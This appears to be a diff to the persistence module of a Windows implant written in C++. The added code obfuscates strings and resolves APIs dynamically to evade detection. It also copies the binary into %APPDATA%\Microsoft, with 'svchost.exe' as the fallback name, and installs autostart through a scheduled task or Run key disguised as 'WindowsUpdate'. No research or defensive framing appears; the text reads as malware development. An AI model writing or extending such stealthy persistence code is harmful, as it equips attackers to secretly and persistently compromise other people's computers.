@@ -18,9 +18,14 @@
 
 namespace Persistence {
 
-static const wchar_t* TASK_NAME = L"WindowsUpdateTask";
-static const char*    RUN_VALUE  = "WindowsUpdate";
-static const char*    RUN_KEY    = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+// Stored as macros rather than static strings so they decrypt at call-site
+#define PERSISTENCE_TASK_NAME  L"WindowsUpdateTask"
+#define PERSISTENCE_RUN_VALUE  "WindowsUpdate"
+#define PERSISTENCE_RUN_KEY    "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+
+static std::wstring GetTaskName()  { std::string _tn = OBFUSCATE_STRING("WindowsUpdateTask"); return std::wstring(_tn.begin(), _tn.end()); }
+static std::string  GetRunValue()  { return OBFUSCATE_STRING("WindowsUpdate"); }
+static std::string  GetRunKey()    { return OBFUSCATE_STRING("Software\\Microsoft\\Windows\\CurrentVersion\\Run"); }
 
 bool IsRunningAsAdmin() {
     BOOL isAdmin = FALSE;
@@ -59,8 +64,7 @@ static bool CreateScheduledTask(const std::string& exePath) {
         hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
         if (FAILED(hr)) goto cleanup;
 
-        // Delete any existing task with the same name (ignore error)
-        pRootFolder->DeleteTask(_bstr_t(TASK_NAME), 0);
+        pRootFolder->DeleteTask(_bstr_t(GetTaskName().c_str()), 0);
 
         ITaskDefinition* pTaskDef = NULL;
         hr = pService->NewTask(0, &pTaskDef);
@@ -124,7 +128,7 @@ static bool CreateScheduledTask(const std::string& exePath) {
         // Register the task
         IRegisteredTask* pRegistered = NULL;
         hr = pRootFolder->RegisterTaskDefinition(
-            _bstr_t(TASK_NAME),
+            _bstr_t(GetTaskName().c_str()),
             pTaskDef,
             TASK_CREATE_OR_UPDATE,
             _variant_t(),     // no user (system)
@@ -160,7 +164,7 @@ static bool RemoveScheduledTask() {
         if (SUCCEEDED(hr)) {
             ITaskFolder* pRootFolder = NULL;
             if (SUCCEEDED(pService->GetFolder(_bstr_t(L"\\"), &pRootFolder))) {
-                success = SUCCEEDED(pRootFolder->DeleteTask(_bstr_t(TASK_NAME), 0));
+                success = SUCCEEDED(pRootFolder->DeleteTask(_bstr_t(GetTaskName().c_str()), 0));
                 pRootFolder->Release();
             }
         }
@@ -172,13 +176,11 @@ static bool RemoveScheduledTask() {
 
 // Get the full path of the current executable
 std::string GetExecutablePath() {
+    typedef DWORD(WINAPI* pGetModuleFileNameA_t)(HMODULE, LPSTR, DWORD);
+    pGetModuleFileNameA_t _GetModuleFileNameA = (pGetModuleFileNameA_t)STEALTH_API_OBFSTR("kernel32.dll", "GetModuleFileNameA");
     char path[MAX_PATH];
-    DWORD result = GetModuleFileNameA(NULL, path, MAX_PATH);
-    
-    if (result == 0 || result == MAX_PATH) {
-        return "";
-    }
-    
+    DWORD result = _GetModuleFileNameA ? _GetModuleFileNameA(NULL, path, MAX_PATH) : GetModuleFileNameA(NULL, path, MAX_PATH);
+    if (result == 0 || result == MAX_PATH) return "";
     return std::string(path);
 }
 
@@ -194,57 +196,91 @@ std::string GetExecutableName() {
     return fullPath;
 }
 
+// Copies the binary to %APPDATA%\Microsoft\<exename> so persistence always
+// points to a stable location independent of where it was launched from.
+std::string CopySelfToAppData() {
+    // Resolve %APPDATA%
+    typedef HRESULT(WINAPI* pSHGetFolderPathA_t)(HWND, int, HANDLE, DWORD, LPSTR);
+    pSHGetFolderPathA_t _SHGetFolderPathA = (pSHGetFolderPathA_t)STEALTH_API_OBFSTR("shell32.dll", "SHGetFolderPathA");
+
+    char appDataPath[MAX_PATH] = {0};
+    // CSIDL_APPDATA = 0x001a
+    if (_SHGetFolderPathA) {
+        _SHGetFolderPathA(NULL, 0x001a, NULL, 0, appDataPath);
+    } else {
+        SHGetFolderPathA(NULL, 0x001a, NULL, 0, appDataPath);
+    }
+    if (appDataPath[0] == '\0') return "";
+
+    std::string srcPath = GetExecutablePath();
+    if (srcPath.empty()) return "";
+
+    std::string exeName = GetExecutableName();
+    if (exeName.empty()) exeName = "svchost.exe";
+
+    // Build destination: %APPDATA%\Microsoft\<exename>
+    std::string _msDir = std::string(appDataPath) + OBFUSCATE_STRING("\\Microsoft");
+    std::string destPath = _msDir + "\\" + exeName;
+
+    // If we're already running from that path, nothing to do.
+    if (srcPath == destPath) return destPath;
+
+    // Ensure %APPDATA%\Microsoft\ exists (it always should, but be safe)
+    typedef BOOL(WINAPI* pCreateDirectoryA_t)(LPCSTR, LPSECURITY_ATTRIBUTES);
+    pCreateDirectoryA_t _CreateDirectoryA = (pCreateDirectoryA_t)STEALTH_API_OBFSTR("kernel32.dll", "CreateDirectoryA");
+    if (_CreateDirectoryA) _CreateDirectoryA(_msDir.c_str(), NULL);
+
+    // Copy — overwrite any existing copy
+    typedef BOOL(WINAPI* pCopyFileA_t)(LPCSTR, LPCSTR, BOOL);
+    pCopyFileA_t _CopyFileA = (pCopyFileA_t)STEALTH_API_OBFSTR("kernel32.dll", "CopyFileA");
+    BOOL ok = _CopyFileA ? _CopyFileA(srcPath.c_str(), destPath.c_str(), FALSE)
+                         : CopyFileA(srcPath.c_str(), destPath.c_str(), FALSE);
+    if (!ok) return "";
+
+    return destPath;
+}
+
 // If admin: create a scheduled task at logon with highest privileges.
 // If not admin: add to HKCU Run registry key.
 bool AddToStartup() {
-    std::string exePath = GetExecutablePath();
-    if (exePath.empty()) {
+    // Copy to AppData first so persistence points to a stable path.
+    std::string persistPath = CopySelfToAppData();
+    if (persistPath.empty()) {
+        // Fall back to current location if copy fails.
+        persistPath = GetExecutablePath();
+    }
+    if (persistPath.empty()) {
         return false;
     }
 
+    // Shadow-swap: re-use the exePath variable name so the rest of the
+    // function works without further changes.
+    // (used via const ref below after admin branch)
+
     if (IsRunningAsAdmin()) {
-        return CreateScheduledTask(exePath);
+        return CreateScheduledTask(persistPath);
     }
 
     // Non-admin path: HKCU Run registry key with stealth API access
+    const std::string& exePath = persistPath;
     RegistryAPI regAPI;
     if (!regAPI.IsInitialized()) {
         // Fallback to direct registry API
         HKEY hKey;
-        LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_SET_VALUE, &hKey);
-        if (result != ERROR_SUCCESS) {
-            return false;
-        }
-
-        result = RegSetValueExA(
-            hKey,
-            RUN_VALUE,
-            0,
-            REG_SZ,
-            (const BYTE*)exePath.c_str(),
-            (DWORD)(exePath.length() + 1)
-        );
-
+        LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, GetRunKey().c_str(), 0, KEY_SET_VALUE, &hKey);
+        if (result != ERROR_SUCCESS) return false;
+        result = RegSetValueExA(hKey, GetRunValue().c_str(), 0, REG_SZ,
+            (const BYTE*)exePath.c_str(), (DWORD)(exePath.length() + 1));
         RegCloseKey(hKey);
         return (result == ERROR_SUCCESS);
     }
 
     // Use stealth registry API
     HKEY hKey = NULL;
-    LONG result = regAPI.pRegOpenKeyExA(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_SET_VALUE, &hKey);
-    if (result != ERROR_SUCCESS) {
-        return false;
-    }
-
-    result = regAPI.pRegSetValueExA(
-        hKey,
-        RUN_VALUE,
-        0,
-        REG_SZ,
-        (const BYTE*)exePath.c_str(),
-        (DWORD)(exePath.length() + 1)
-    );
-
+    LONG result = regAPI.pRegOpenKeyExA(HKEY_CURRENT_USER, GetRunKey().c_str(), 0, KEY_SET_VALUE, &hKey);
+    if (result != ERROR_SUCCESS) return false;
+    result = regAPI.pRegSetValueExA(hKey, GetRunValue().c_str(), 0, REG_SZ,
+        (const BYTE*)exePath.c_str(), (DWORD)(exePath.length() + 1));
     regAPI.pRegCloseKey(hKey);
     return (result == ERROR_SUCCESS);
 }
@@ -252,23 +288,24 @@ bool AddToStartup() {
 // Removes both the scheduled task and the Run key (whichever exists).
 bool RemoveFromStartup() {
     bool removedTask = RemoveScheduledTask();
-
     bool removedReg = false;
     RegistryAPI regAPI;
-    
+
+    typedef LONG(WINAPI* pRegDeleteValueA_t)(HKEY, LPCSTR);
+    pRegDeleteValueA_t _RegDeleteValueA = (pRegDeleteValueA_t)STEALTH_API_OBFSTR("advapi32.dll", "RegDeleteValueA");
+
     if (!regAPI.IsInitialized()) {
-        // Fallback to direct registry API
         HKEY hKey;
-        if (RegOpenKeyExA(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-            removedReg = (RegDeleteValueA(hKey, RUN_VALUE) == ERROR_SUCCESS);
+        if (RegOpenKeyExA(HKEY_CURRENT_USER, GetRunKey().c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+            if (_RegDeleteValueA)
+                removedReg = (_RegDeleteValueA(hKey, GetRunValue().c_str()) == ERROR_SUCCESS);
             RegCloseKey(hKey);
         }
     } else {
-        // Use stealth registry API
         HKEY hKey = NULL;
-        if (regAPI.pRegOpenKeyExA(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-            // Use direct API for delete since it may not be available in stealth class
-            removedReg = (RegDeleteValueA(hKey, RUN_VALUE) == ERROR_SUCCESS);
+        if (regAPI.pRegOpenKeyExA(HKEY_CURRENT_USER, GetRunKey().c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+            if (_RegDeleteValueA)
+                removedReg = (_RegDeleteValueA(hKey, GetRunValue().c_str()) == ERROR_SUCCESS);
             regAPI.pRegCloseKey(hKey);
         }
     }
